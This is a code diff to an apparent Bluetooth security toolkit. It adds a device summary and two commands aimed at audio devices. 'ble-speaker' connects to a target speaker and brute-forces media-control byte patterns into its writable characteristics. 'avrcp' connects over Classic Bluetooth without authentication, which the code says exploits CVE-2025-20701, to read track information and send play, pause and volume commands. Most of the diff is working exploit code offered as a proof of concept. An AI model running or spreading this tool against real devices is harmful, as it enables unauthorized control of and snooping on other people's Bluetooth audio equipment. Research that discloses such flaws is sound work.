-            if "Audio" in service_name or "Handsfree" in service_name:
-                device_types.append("Audio Device")
-            if "HID" in service_name:
-                device_types.append("Input Device (HID)")
-            if "Heart Rate" in service_name:
-                device_types.append("Fitness Tracker")
-            appearance_name = device_info.get("appearance_name") or ""
-            if "Watch" in service_name or "watch" in appearance_name.lower():
-                device_types.append("Smartwatch")
-            if "AirPods" in service_name:
-                device_types.append("Apple AirPods")
+        # Automated research for unknown characteristics
+        if unknown_characteristics:
+            print_header("RESEARCHING UNKNOWN CHARACTERISTICS")
+            print(
+                f"  \033[0;90mPerforming automated lookups for {len(unknown_characteristics)} unknown characteristic(s)...\033[0m\n")
 
-        if not device_types:
-            device_types = ["Generic BLE Device"]
+            try:
+                research = await research_unknown_characteristics(unknown_characteristics, target_address)
+                print_research_results(
+                    research, unknown_characteristics, term_width)
+            except Exception as e:
+                logging.debug(f"Research failed: {e}")
+                print(
+                    f"  \033[0;33m⚠ Automated research failed (network issue?)\033[0m")
+                print(f"  \033[0;90mManual research URLs:\033[0m")
+                mac_parts = target_address.replace("/P", "").split(":")
+                if len(mac_parts) >= 3:
+                    oui = "".join(mac_parts[:3]).upper()
+                    print(
+                        f"    → https://maclookup.app/search/result?mac={oui}")
+                print(
+                    f"    → https://github.com/NordicSemiconductor/bluetooth-numbers-database")
+                for uuid, _, _ in unknown_characteristics[:3]:
+                    print(f"    → Google: \"{uuid}\"")
 
+        # Print Device Information at the end (after all checks)
+        print_header("DEVICE SUMMARY")
+        print_field("Address", target_address)
         print_field("Device Type", ", ".join(set(device_types)))
+        print_field("Name", device_info["name"])
+        if device_info["appearance"]:
+            print_field(
+                "Appearance", f"{device_info['appearance_name']} ({device_info['appearance']})")
+        print_field("Manufacturer", device_info["manufacturer"])
+        print_field("Model", device_info["model"])
+        print_field("Serial Number", device_info["serial"])
+        print_field("Firmware Rev", device_info["firmware"])
+        print_field("Hardware Rev", device_info["hardware"])
+        print_field("Software Rev", device_info["software"])
+        if device_info["battery"] is not None:
+            battery_bar = "█" * \
+                (device_info["battery"] // 10) + "░" * \
+                (10 - device_info["battery"] // 10)
+            print_field(
+                "Battery", f"{device_info['battery']}% [{battery_bar}]")
+        if device_info.get("battery_state") is not None:
+            state_val = device_info["battery_state"]
+            # Decode battery power state flags
+            states = []
+            if state_val & 0x01:
+                states.append("Present")
+            if state_val & 0x02:
+                states.append("Discharging")
+            if state_val & 0x04:
+                states.append("Charging")
+            if state_val & 0x08:
+                states.append("Critical")
+            print_field("Battery State", ", ".join(states)
+                        if states else f"0x{state_val:02X}")
         print_field("Total Services", len(services_found))
+        print_field("Unknown Characteristics", len(
+            unknown_characteristics) if unknown_characteristics else "None")
         print_field("Connection Status", "\033[1;32mConnected\033[0m")
 
         print(f"\n\033[1;36m{'═' * term_width}\033[0m\n")
@@ -2672,6 +3345,783 @@ async def command_ble_info(args: argparse.Namespace):
                 await t.close()
         except Exception:
             pass
+
+
+# =============================================================================
+# BLE SPEAKER CONTROL PoC
+# =============================================================================
+
+# Common media control command patterns used by various vendors
+MEDIA_CONTROL_PATTERNS = {
+    "play": [
+        bytes([0x01]),           # Simple play command
+        bytes([0x00, 0x01]),     # Play with prefix
+        bytes([0x41]),           # ASCII 'A' - some use this
+        bytes([0xB0]),           # AVRCP-like play
+        bytes([0x01, 0x00]),     # Little-endian play
+        b"play",                 # ASCII command
+        # Common Chinese module format
+        bytes([0x7E, 0x04, 0x03, 0x00, 0x00, 0x00, 0xEF]),
+    ],
+    "pause": [
+        bytes([0x02]),
+        bytes([0x00, 0x02]),
+        bytes([0xB1]),           # AVRCP-like pause
+        bytes([0x02, 0x00]),
+        b"pause",
+        bytes([0x7E, 0x04, 0x03, 0x00, 0x01, 0x00, 0xEF]),
+    ],
+    "next": [
+        bytes([0x03]),
+        bytes([0x00, 0x03]),
+        bytes([0xB3]),           # AVRCP-like next
+        b"next",
+        bytes([0x7E, 0x04, 0x01, 0x00, 0x00, 0x00, 0xEF]),
+    ],
+    "prev": [
+        bytes([0x04]),
+        bytes([0x00, 0x04]),
+        bytes([0xB4]),           # AVRCP-like prev
+        b"prev",
+        bytes([0x7E, 0x04, 0x02, 0x00, 0x00, 0x00, 0xEF]),
+    ],
+    "vol-up": [
+        bytes([0x05]),
+        bytes([0x00, 0x05]),
+        bytes([0x41]),           # Volume up
+        b"vol+",
+        bytes([0x7E, 0x04, 0x04, 0x00, 0x00, 0x00, 0xEF]),
+    ],
+    "vol-down": [
+        bytes([0x06]),
+        bytes([0x00, 0x06]),
+        bytes([0x42]),           # Volume down
+        b"vol-",
+        bytes([0x7E, 0x04, 0x05, 0x00, 0x00, 0x00, 0xEF]),
+    ],
+    "mute": [
+        bytes([0x07]),
+        bytes([0x00, 0x07]),
+        bytes([0x43]),           # Mute toggle
+        b"mute",
+    ],
+}
+
+# Known speaker/audio control service UUIDs
+KNOWN_AUDIO_SERVICES = {
+    "0000110b-0000-1000-8000-00805f9b34fb": "Audio Sink (A2DP)",
+    "0000110a-0000-1000-8000-00805f9b34fb": "Audio Source",
+    "0000110e-0000-1000-8000-00805f9b34fb": "AVRCP Target",
+    "0000110c-0000-1000-8000-00805f9b34fb": "AVRCP Controller",
+    "0000111e-0000-1000-8000-00805f9b34fb": "Handsfree",
+    "00001108-0000-1000-8000-00805f9b34fb": "Headset",
+    # Logitech-specific (from our scan)
+    "000061fe-0000-1000-8000-00805f9b34fb": "Logitech Proprietary",
+}
+
+
+async def command_ble_speaker(args: argparse.Namespace):
+    """Bluetooth speaker control PoC - probe and control audio devices via BLE.
+
+    This command demonstrates that BLE-connected speakers often expose control
+    characteristics without authentication, allowing unauthorized:
+    - Media playback control (play, pause, skip)
+    - Volume control
+    - Device status reading
+
+    This is a proof-of-concept for demonstrating BLE audio device security.
+    """
+    from bumble.device import Device, DeviceConfiguration, Peer
+    from bumble.transport import open_transport_or_link
+    from bumble.hci import Address
+
+    controller = args.controller or "usb:0"
+    target_address = args.target_address
+    action = getattr(args, 'action', 'probe')
+    char_uuid = getattr(args, 'char_uuid', None)
+    write_data = getattr(args, 'write_data', None)
+    timeout = getattr(args, 'timeout', 30.0)
+
+    if not target_address:
+        logging.error("Target address required. Use --target-address")
+        return
+
+    release_bluetooth_controller(controller)
+
+    term_width = os.get_terminal_size().columns
+
+    print(f"\n\033[1;36m{'═' * term_width}\033[0m")
+    print(f"\033[1;36m  BLE SPEAKER CONTROL PoC\033[0m")
+    print(f"\033[1;36m{'═' * term_width}\033[0m\n")
+    print(f"  Target: {target_address}")
+    print(f"  Action: {action}")
+    if char_uuid:
+        print(f"  Characteristic: {char_uuid}")
+    print()
+
+    t = None
+    connection = None
+    device = None
+
+    try:
+        t = await open_transport_or_link(controller)
+        device_config = DeviceConfiguration()
+        device_config.name = "RACE-Speaker-PoC"
+        device_config.address = Address.generate_static_address()
+        device = Device.from_config_with_hci(device_config, t.source, t.sink)
+        await device.power_on()
+
+        # Connect to device
+        print(f"  Connecting to {target_address}...")
+
+        # Handle public/random address
+        addr_str = target_address.replace("/P", "")
+        if target_address.endswith("/P"):
+            address = Address(addr_str, Address.PUBLIC_DEVICE_ADDRESS)
+        else:
+            address = Address(addr_str, Address.RANDOM_DEVICE_ADDRESS)
+
+        connection = await asyncio.wait_for(
+            device.connect(address),
+            timeout=timeout
+        )
+
+        print(
+            f"  \033[1;32mConnected!\033[0m Handle: 0x{connection.handle:04X}\n")
+
+        # Discover services
+        print(f"  Discovering GATT services...")
+        peer = Peer(connection)
+        await peer.discover_services()
+        await peer.discover_characteristics()
+
+        # Collect all characteristics
+        all_chars = []
+        writable_chars = []
+        readable_chars = []
+
+        for service in peer.services:
+            service_uuid = str(service.uuid).lower()
+            for char in service.characteristics:
+                char_uuid_str = str(char.uuid).lower()
+                props = []
+                if char.properties & 0x02:
+                    props.append("Read")
+                    readable_chars.append((service_uuid, char))
+                if char.properties & 0x04:
+                    props.append("WriteNoResp")
+                    writable_chars.append((service_uuid, char, "WriteNoResp"))
+                if char.properties & 0x08:
+                    props.append("Write")
+                    writable_chars.append((service_uuid, char, "Write"))
+                if char.properties & 0x10:
+                    props.append("Notify")
+                if char.properties & 0x20:
+                    props.append("Indicate")
+
+                all_chars.append({
+                    "service": service_uuid,
+                    "char": char,
+                    "uuid": char_uuid_str,
+                    "props": props
+                })
+
+        print(
+            f"  Found {len(all_chars)} characteristics ({len(writable_chars)} writable, {len(readable_chars)} readable)\n")
+
+        def print_header(title):
+            print(f"\n\033[1;36m{'─' * term_width}\033[0m")
+            print(f"\033[1;36m  {title}\033[0m")
+            print(f"\033[1;36m{'─' * term_width}\033[0m")
+
+        if action == "probe":
+            # Probe mode - analyze the device for potential control characteristics
+            print_header("SPEAKER CONTROL ANALYSIS")
+
+            print(
+                f"\n  \033[1;33m🔍 Writable Characteristics (potential controls):\033[0m\n")
+
+            for svc_uuid, char, write_type in writable_chars:
+                char_uuid_str = str(char.uuid).lower()
+
+                # Try to identify purpose
+                purpose = "Unknown"
+                if "2a00" in char_uuid_str:
+                    purpose = "Device Name (not a control)"
+                elif any(x in char_uuid_str for x in ["ffd1", "ffd2", "ffe1", "ffe2"]):
+                    purpose = "⚡ UART TX/RX - likely command channel!"
+                elif "control" in char_uuid_str or "cmd" in char_uuid_str:
+                    purpose = "⚡ Likely control characteristic!"
+
+                print(f"    • {char_uuid_str}")
+                print(f"      Service: {svc_uuid[:8]}...")
+                print(f"      Write Type: {write_type}")
+                print(f"      Purpose: {purpose}")
+                print()
+
+            print(f"  \033[1;33m📋 Suggested Commands:\033[0m\n")
+            print(f"    Try reading all characteristics to understand the device:")
+            print(
+                f"    \033[0;36m  python race_toolkit.py -c {controller} --target-address {target_address} ble-speaker --action read-all\033[0m\n")
+            print(f"    Try writing test patterns to find control characteristics:")
+            print(
+                f"    \033[0;36m  python race_toolkit.py -c {controller} --target-address {target_address} ble-speaker --action write-test\033[0m\n")
+            print(f"    Try specific media control:")
+            print(
+                f"    \033[0;36m  python race_toolkit.py -c {controller} --target-address {target_address} ble-speaker --action play\033[0m\n")
+
+        elif action == "read-all":
+            # Read all readable characteristics
+            print_header("READING ALL CHARACTERISTICS")
+
+            for svc_uuid, char in readable_chars:
+                char_uuid_str = str(char.uuid).lower()
+                try:
+                    value = await asyncio.wait_for(peer.read_value(char), timeout=5.0)
+
+                    # Try to interpret the value
+                    hex_val = value.hex() if value else "(empty)"
+                    try:
+                        ascii_val = value.decode(
+                            'utf-8', errors='replace') if value else ""
+                        ascii_val = ''.join(
+                            c if c.isprintable() else '.' for c in ascii_val)
+                    except Exception:
+                        ascii_val = ""
+
+                    print(f"\n  \033[1;32m✓\033[0m {char_uuid_str}")
+                    print(f"    Hex: {hex_val}")
+                    if ascii_val and len(ascii_val) > 0:
+                        print(f"    ASCII: \"{ascii_val}\"")
+                    if len(value) == 1:
+                        print(f"    Int: {value[0]}")
+                    elif len(value) == 2:
+                        print(f"    Int16: {int.from_bytes(value, 'little')}")
+
+                except asyncio.TimeoutError:
+                    print(
+                        f"\n  \033[0;33m⏱\033[0m {char_uuid_str} - Read timeout")
+                except Exception as e:
+                    print(f"\n  \033[0;31m✗\033[0m {char_uuid_str} - {e}")
+
+        elif action == "write-test":
+            # Probe writable characteristics with test patterns
+            print_header("PROBING WRITABLE CHARACTERISTICS")
+            print(
+                f"\n  \033[0;33m⚠ This will write test data to the device!\033[0m\n")
+
+            for svc_uuid, char, write_type in writable_chars:
+                char_uuid_str = str(char.uuid).lower()
+
+                # Skip standard characteristics
+                if char_uuid_str.startswith("00002a") or "2a" in char_uuid_str[:10]:
+                    continue
+
+                print(f"\n  Testing: {char_uuid_str}")
+
+                # First, try to read the characteristic to determine expected length
+                expected_len = None
+                current_value = None
+                if char in [c for _, c in readable_chars]:
+                    try:
+                        current_value = await asyncio.wait_for(
+                            peer.read_value(char), timeout=2.0)
+                        expected_len = len(current_value)
+                        print(
+                            f"    Current value: {current_value.hex()} ({expected_len} bytes)")
+                    except Exception:
+                        pass
+
+                # Build test patterns based on detected length
+                test_patterns = []
+
+                if expected_len == 1:
+                    # Single byte controls
+                    test_patterns = [
+                        (bytes([0x00]), "Reset/Stop (0x00)"),
+                        (bytes([0x01]), "Play/Start (0x01)"),
+                        (bytes([0x02]), "Pause (0x02)"),
+                        (bytes([0x03]), "Next (0x03)"),
+                        (bytes([0x04]), "Prev (0x04)"),
+                    ]
+                    # Also try incrementing/decrementing current value
+                    if current_value:
+                        val = current_value[0]
+                        if val > 0:
+                            test_patterns.append(
+                                (bytes([val - 1]), f"Decrement ({val-1})"))
+                        if val < 255:
+                            test_patterns.append(
+                                (bytes([val + 1]), f"Increment ({val+1})"))
+
+                elif expected_len == 2:
+                    # 2-byte commands (common for media control)
+                    test_patterns = [
+                        (bytes([0x00, 0x00]), "Zero (0x0000)"),
+                        (bytes([0x00, 0x01]), "Play (0x0001)"),
+                        (bytes([0x00, 0x02]), "Pause (0x0002)"),
+                        (bytes([0x01, 0x00]), "Play alt (0x0100)"),
+                        (bytes([0x02, 0x00]), "Pause alt (0x0200)"),
+                        (bytes([0xCD, 0x00]), "AVRCP Play (0xCD00)"),
+                        (bytes([0xCE, 0x00]), "AVRCP Pause (0xCE00)"),
+                    ]
+
+                elif expected_len and expected_len > 2:
+                    # Longer packets - try preserving structure, changing first/last bytes
+                    if current_value:
+                        # Try flipping first byte
+                        modified = bytearray(current_value)
+                        modified[0] = 0x01 if modified[0] == 0x00 else 0x00
+                        test_patterns.append(
+                            (bytes(modified), f"Toggle first byte"))
+
+                        # Try flipping last byte
+                        modified = bytearray(current_value)
+                        modified[-1] = 0x01 if modified[-1] == 0x00 else 0x00
+                        test_patterns.append(
+                            (bytes(modified), f"Toggle last byte"))
+
+                        # Try all zeros of same length
+                        test_patterns.append(
+                            (bytes(expected_len), f"All zeros ({expected_len}b)"))
+
+                        # Try all ones of same length
+                        test_patterns.append(
+                            (bytes([0x01] * expected_len), f"All ones ({expected_len}b)"))
+                else:
+                    # Unknown length - try common sizes
+                    test_patterns = [
+                        (bytes([0x01]), "1-byte: Play (0x01)"),
+                        (bytes([0x00, 0x01]), "2-byte: Play (0x0001)"),
+                        (bytes([0x01, 0x00]), "2-byte: Play alt (0x0100)"),
+                        (bytes([0x00, 0x00, 0x01]), "3-byte: Play (0x000001)"),
+                        (bytes(20), "20-byte: Zeros"),
+                    ]
+
+                for pattern, desc in test_patterns:
+                    try:
+                        if write_type == "WriteNoResp":
+                            await peer.write_value(char, pattern, with_response=False)
+                        else:
+                            await peer.write_value(char, pattern, with_response=True)
+                        print(
+                            f"    \033[1;32m✓\033[0m {desc} - Write succeeded!")
+                        await asyncio.sleep(0.5)  # Give device time to react
+
+                        # Try to read back the value to see if it changed
+                        if char in [c for _, c in readable_chars]:
+                            try:
+                                new_value = await asyncio.wait_for(
+                                    peer.read_value(char), timeout=1.0)
+                                if new_value != current_value:
+                                    print(
+                                        f"        → Value changed to: {new_value.hex()}")
+                            except Exception:
+                                pass
+
+                    except Exception as e:
+                        err_str = str(e)
+                        if "INVALID_ATTRIBUTE_LENGTH" in err_str:
+                            print(
+                                f"    \033[0;90m✗\033[0m {desc} - Wrong length")
+                        elif "NOT_PERMITTED" in err_str or "WRITE_NOT_PERMITTED" in err_str:
+                            print(
+                                f"    \033[0;33m⚠\033[0m {desc} - Not permitted (needs auth?)")
+                        else:
+                            print(f"    \033[0;31m✗\033[0m {desc} - {e}")
+
+        elif action in MEDIA_CONTROL_PATTERNS:
+            # Try to send media control command
+            print_header(f"SENDING {action.upper()} COMMAND")
+
+            patterns = MEDIA_CONTROL_PATTERNS[action]
+
+            if char_uuid:
+                # User specified a characteristic
+                target_chars = [(svc, c, wt) for svc, c, wt in writable_chars
+                                if char_uuid.lower() in str(c.uuid).lower()]
+                if not target_chars:
+                    print(
+                        f"\n  \033[0;31m✗ Characteristic {char_uuid} not found or not writable\033[0m")
+                    return
+            else:
+                # Try all writable non-standard characteristics
+                target_chars = [(svc, c, wt) for svc, c, wt in writable_chars
+                                if not str(c.uuid).lower().startswith("00002a")]
+
+            print(
+                f"\n  Trying {len(patterns)} command patterns on {len(target_chars)} characteristic(s)...\n")
+
+            success_count = 0
+            for svc_uuid, char, write_type in target_chars:
+                char_uuid_str = str(char.uuid).lower()
+                print(f"  Characteristic: {char_uuid_str}")
+
+                for pattern in patterns:
+                    try:
+                        if write_type == "WriteNoResp":
+                            await peer.write_value(char, pattern, with_response=False)
+                        else:
+                            await peer.write_value(char, pattern, with_response=True)
+
+                        print(
+                            f"    \033[1;32m✓\033[0m Sent: {pattern.hex()} ({len(pattern)} bytes)")
+                        success_count += 1
+                        await asyncio.sleep(0.3)
+
+                    except Exception as e:
+                        error_str = str(e).lower()
+                        if "not permitted" in error_str or "not allowed" in error_str:
+                            print(
+                                f"    \033[0;33m⚠\033[0m {pattern.hex()} - Not permitted (may need auth)")
+                        else:
+                            print(
+                                f"    \033[0;31m✗\033[0m {pattern.hex()} - {e}")
+                print()
+
+            if success_count > 0:
+                print(
+                    f"\n  \033[1;32m✓ {success_count} write(s) succeeded!\033[0m")
+                print(f"    Check if the speaker responded to any command.")
+            else:
+                print(
+                    f"\n  \033[0;33m⚠ No writes succeeded. Device may require authentication.\033[0m")
+
+        elif action in ["play", "pause", "next", "prev", "vol-up", "vol-down", "mute"]:
+            # Handle as media control
+            print_header(f"SENDING {action.upper()} COMMAND")
+            patterns = MEDIA_CONTROL_PATTERNS.get(action, [])
+
+            target_chars = [(svc, c, wt) for svc, c, wt in writable_chars
+                            if not str(c.uuid).lower().startswith("00002a")]
+
+            print(
+                f"\n  Trying {len(patterns)} patterns on {len(target_chars)} writable characteristic(s)...\n")
+
+            for svc_uuid, char, write_type in target_chars:
+                char_uuid_str = str(char.uuid).lower()
+                for pattern in patterns:
+                    try:
+                        await peer.write_value(char, pattern, with_response=(write_type == "Write"))
+                        print(
+                            f"  \033[1;32m✓\033[0m {char_uuid_str}: Sent {pattern.hex()}")
+                        await asyncio.sleep(0.2)
+                    except Exception:
+                        pass  # Silently skip failures in this mode
+
+        else:
+            print(f"\n  Unknown action: {action}")
+
+        print(f"\n\033[1;36m{'═' * term_width}\033[0m\n")
+
+    except asyncio.TimeoutError:
+        print(
+            f"\n  \033[0;31m✗ Connection timed out after {timeout}s\033[0m\n")
+    except Exception as e:
+        logging.error("Speaker control failed: %s", e)
+        import traceback
+        traceback.print_exc()
+    finally:
+        try:
+            if connection:
+                await connection.disconnect()
+            if t:
+                await t.close()
+        except Exception:
+            pass
+
+
+async def command_avrcp(args: argparse.Namespace):
+    """AVRCP media control via Classic Bluetooth without authentication.
+
+    This command connects to a Bluetooth audio device via Classic Bluetooth
+    and uses AVRCP (Audio/Video Remote Control Profile) to control playback.
+
+    This exploits CVE-2025-20701 - devices that allow BR/EDR connections
+    without proper authentication, enabling unauthorized media control.
+    """
+    from bumble.device import Device, DeviceConfiguration
+    from bumble.transport import open_transport_or_link
+    from bumble.hci import Address
+    from bumble.core import BT_BR_EDR_TRANSPORT
+    from bumble import avrcp, avc
+
+    controller = args.controller or "usb:0"
+    target_address = args.target_address
+    action = getattr(args, 'action', 'info')
+    repeat_count = getattr(args, 'repeat', 1)
+    hold_time = getattr(args, 'hold_time', 0.1)
+    timeout = getattr(args, 'timeout', 30.0)
+
+    if not target_address:
+        logging.error("Target address required. Use --target-address")
+        return
+
+    release_bluetooth_controller(controller)
+
+    term_width = min(os.get_terminal_size().columns, 100)
+
+    # Map actions to AVRCP operation IDs
+    AVRCP_OPERATIONS = {
+        "play": avc.PassThroughFrame.OperationId.PLAY,
+        "pause": avc.PassThroughFrame.OperationId.PAUSE,
+        "stop": avc.PassThroughFrame.OperationId.STOP,
+        "next": avc.PassThroughFrame.OperationId.FORWARD,
+        "prev": avc.PassThroughFrame.OperationId.BACKWARD,
+        "vol-up": avc.PassThroughFrame.OperationId.VOLUME_UP,
+        "vol-down": avc.PassThroughFrame.OperationId.VOLUME_DOWN,
+        "mute": avc.PassThroughFrame.OperationId.MUTE,
+        "ff": avc.PassThroughFrame.OperationId.FAST_FORWARD,
+        "rewind": avc.PassThroughFrame.OperationId.REWIND,
+    }
+
+    print(f"\n\033[1;36m{'═' * term_width}\033[0m")
+    print(f"\033[1;36m  AVRCP MEDIA CONTROL - NO AUTHENTICATION\033[0m")
+    print(f"\033[1;36m{'═' * term_width}\033[0m\n")
+    print(f"  Target: {target_address}")
+    print(f"  Action: {action}")
+    print(f"  Auth: \033[1;31mDISABLED (CVE-2025-20701 exploit)\033[0m")
+    if action != "info":
+        print(f"  Repeat: {repeat_count}x")
+        print(f"  Hold Time: {hold_time}s")
+    print()
+
+    # Use RFCOMMBumbleChecker for consistent connection approach
+    checker = RFCOMMBumbleChecker(controller, target_address, False)
+    await checker.setup()
+
+    print(
+        f"  \033[1;33mConnecting to {target_address} (NO AUTHENTICATION)...\033[0m")
+
+    max_retries = 3
+    retry_delay = 2.0
+    connected = False
+
+    for attempt in range(max_retries + 1):
+        try:
+            if checker.device is None:
+                logging.error("Bluetooth device not initialized")
+                return
+
+            checker.connection = await asyncio.wait_for(
+                checker.device.connect(
+                    target_address, transport=BT_BR_EDR_TRANSPORT),
+                timeout=timeout
+            )
+            connected = True
+            print(f"  \033[1;32m✓ Connected WITHOUT authentication!\033[0m")
+            print(f"    Handle: 0x{checker.connection.handle:04X}")
+            break
+
+        except asyncio.TimeoutError:
+            print(
+                f"\n  \033[1;31mConnection timed out after {timeout}s\033[0m")
+            break
+
+        except Exception as e:
+            error_str = str(e).lower()
+
+            if "page_timeout" in error_str:
+                if attempt < max_retries:
+                    print(
+                        f"  \033[0;33m⚠ Device not responding (attempt {attempt+1}/{max_retries+1})\033[0m")
+                    print(f"    Retrying in {retry_delay}s...")
+                    await asyncio.sleep(retry_delay)
+                    continue
+                else:
+                    print(
+                        f"\n  \033[1;31m✗ Device not responding to Classic Bluetooth\033[0m")
+                    print(f"\n  Possible causes:")
+                    print(f"    • Device is connected to another phone/computer")
+                    print(f"    • Device is in BLE-only mode")
+                    print(f"    • Device is out of range or powered off")
+                    print(f"\n  Try:")
+                    print(f"    • Disconnect the device from your phone first")
+                    print(f"    • Put device in pairing mode")
+                    print(f"    • Move closer to the device")
+                    await checker.close()
+                    return
+
+            elif "limited_resources" in error_str:
+                print(f"  \033[0;33m⚠ Controller busy, resetting...\033[0m")
+                await checker.close()
+                release_bluetooth_controller(controller)
+                await asyncio.sleep(2.0)
+                checker = RFCOMMBumbleChecker(
+                    controller, target_address, False)
+                await checker.setup()
+                continue
+
+            else:
+                print(f"\n  \033[1;31mConnection failed: {e}\033[0m")
+                await checker.close()
+                return
+
+    if not connected:
+        await checker.close()
+        return
+
+    connection = checker.connection
+    avrcp_protocol = None
+
+    try:
+        # Connect AVRCP protocol directly - NO AUTHENTICATION
+        print(f"\n  \033[1;33mConnecting AVRCP (no authentication)...\033[0m")
+
+        # Create a minimal delegate
+        class MinimalDelegate(avrcp.Delegate):
+            def __init__(self):
+                self.volume = 0x7F
+
+            async def get_supported_player_application_setting_attributes(self):
+                return []
+
+            async def get_player_application_setting_attribute_text(self, attribute_ids):
+                return []
+
+            async def get_player_application_setting_values(self, attribute_ids):
+                return []
+
+            async def get_player_application_setting_value_text(self, attribute_id, value_ids):
+                return []
+
+            async def set_player_application_setting_values(self, settings):
+                pass
+
+            async def get_element_attributes(self, identifier, attribute_ids):
+                return []
+
+            async def inform_battery_status_of_ct(self, battery_status):
+                return avrcp.StatusCode.SUCCESS
+
+            async def set_absolute_volume(self, volume):
+                self.volume = volume
+                return volume
+
+            async def get_now_playing_items(self, *args):
+                return 0, []
+
+        delegate = MinimalDelegate()
+        avrcp_protocol = avrcp.Protocol(delegate)
+
+        try:
+            await asyncio.wait_for(
+                avrcp_protocol.connect(connection),
+                timeout=10.0
+            )
+            print(
+                f"  \033[1;32m✓ AVRCP connected without authentication!\033[0m")
+        except Exception as e:
+            print(f"\n  \033[1;31m✗ AVRCP connection failed: {e}\033[0m")
+            print(f"  Device may require authentication for AVRCP.")
+            return
+
+        await asyncio.sleep(0.3)
+
+        if action == "info":
+            print(f"\n\033[1;36m{'─' * term_width}\033[0m")
+            print(f"\033[1;36m  DEVICE INFO (unauthenticated)\033[0m")
+            print(f"\033[1;36m{'─' * term_width}\033[0m\n")
+
+            # Get supported events
+            try:
+                print(f"  Querying capabilities...")
+                events = await asyncio.wait_for(
+                    avrcp_protocol.get_supported_events(),
+                    timeout=5.0
+                )
+                print(f"  \033[1;32mSupported Events:\033[0m")
+                for event in events:
+                    print(f"    • {event.name}")
+            except Exception as e:
+                print(f"  \033[0;33m⚠ Could not get events: {e}\033[0m")
+
+            # Get play status
+            try:
+                print(f"\n  Querying play status...")
+                status = await asyncio.wait_for(
+                    avrcp_protocol.get_play_status(),
+                    timeout=5.0
+                )
+                print(f"  \033[1;32mPlay Status:\033[0m")
+                print(
+                    f"    • Status: {status.play_status.name if status.play_status else 'Unknown'}")
+                if status.song_length and status.song_length != 0xFFFFFFFF:
+                    mins, secs = divmod(status.song_length // 1000, 60)
+                    print(f"    • Song Length: {mins}:{secs:02d}")
+                if status.song_position and status.song_position != 0xFFFFFFFF:
+                    mins, secs = divmod(status.song_position // 1000, 60)
+                    print(f"    • Position: {mins}:{secs:02d}")
+            except Exception as e:
+                print(f"  \033[0;33m⚠ Could not get play status: {e}\033[0m")
+
+            # Get track info
+            try:
+                print(f"\n  Querying track info...")
+                attributes = await asyncio.wait_for(
+                    avrcp_protocol.get_element_attributes(
+                        0,
+                        [avrcp.MediaAttributeId.TITLE, avrcp.MediaAttributeId.ARTIST_NAME,
+                            avrcp.MediaAttributeId.ALBUM_NAME]
+                    ),
+                    timeout=5.0
+                )
+                if attributes:
+                    print(f"  \033[1;32mTrack Info:\033[0m")
+                    for attr in attributes:
+                        print(
+                            f"    • {attr.attribute_id.name}: {attr.attribute_value}")
+            except Exception as e:
+                print(f"  \033[0;33m⚠ Could not get track info: {e}\033[0m")
+
+            print(
+                f"\n  \033[1;32m✓ Successfully accessed device WITHOUT authentication!\033[0m")
+            print(f"\n  Control commands:")
+            print(f"    \033[0;36m... avrcp --action play\033[0m")
+            print(f"    \033[0;36m... avrcp --action pause\033[0m")
+            print(f"    \033[0;36m... avrcp --action next\033[0m")
+            print(f"    \033[0;36m... avrcp --action vol-up --repeat 5\033[0m")
+
+        else:
+            # Send media control command
+            operation = AVRCP_OPERATIONS.get(action)
+            if not operation:
+                print(f"\n  \033[0;31m✗ Unknown action: {action}\033[0m")
+                return
+
+            print(f"\n\033[1;36m{'─' * term_width}\033[0m")
+            print(f"\033[1;36m  SENDING {action.upper()} (no auth)\033[0m")
+            print(f"\033[1;36m{'─' * term_width}\033[0m\n")
+
+            for i in range(repeat_count):
+                if repeat_count > 1:
+                    print(f"  [{i+1}/{repeat_count}] ", end="")
+                else:
+                    print(f"  ", end="")
+
+                try:
+                    print(f"Sending {action}... ", end="", flush=True)
+                    await avrcp_protocol.send_key_event(operation, True)
+                    await asyncio.sleep(hold_time)
+                    await avrcp_protocol.send_key_event(operation, False)
+                    print(f"\033[1;32m✓ Success!\033[0m")
+
+                    if i < repeat_count - 1:
+                        await asyncio.sleep(0.2)
+                except Exception as e:
+                    print(f"\033[0;31m✗ Failed: {e}\033[0m")
+
+            print(
+                f"\n  \033[1;32m✓ Command sent without authentication!\033[0m")
+
+        print(f"\n\033[1;36m{'═' * term_width}\033[0m\n")
+
+    except Exception as e:
+        logging.error("AVRCP control failed: %s", e)
+        import traceback
+        traceback.print_exc()
+    finally:
+        await checker.close()
 
 
 async def command_enumerate_classic(args: argparse.Namespace):
@@ -4211,6 +5661,12 @@ async def main():
         return
     if args.command == "ble-info":
         await command_ble_info(args)
+        return
+    if args.command == "ble-speaker":
+        await command_ble_speaker(args)
+        return
+    if args.command == "avrcp":
+        await command_avrcp(args)
         return
 
     # Initialize the transport class based on the given technology and target UUIDs
